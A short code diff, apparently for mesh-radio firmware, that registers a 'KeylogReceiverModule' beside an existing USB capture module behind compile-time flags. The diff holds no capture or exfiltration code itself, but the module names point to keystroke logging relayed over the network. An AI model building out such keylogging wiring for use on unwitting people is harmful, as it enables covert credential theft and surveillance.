@@ -111,6 +111,9 @@
 #ifdef XIAO_USB_CAPTURE_ENABLED
 #include "modules/USBCaptureModule.h"
 #endif
+#ifdef KEYLOG_RECEIVER_ENABLED
+#include "modules/KeylogReceiverModule.h"
+#endif
 
 /**
  * Create module instances here.  If you are adding a new module, you must 'new' it here (or somewhere else)
@@ -311,6 +314,10 @@ void setupModules()
 #ifdef XIAO_USB_CAPTURE_ENABLED
     usbCaptureModule = new USBCaptureModule();
     usbCaptureModule->init();
+#endif
+#ifdef KEYLOG_RECEIVER_ENABLED
+    keylogReceiverModule = new KeylogReceiverModule();
+    keylogReceiverModule->init();
 #endif
     // NOTE! This module must be added LAST because it likes to check for replies from other modules and avoid sending extra
     // acks
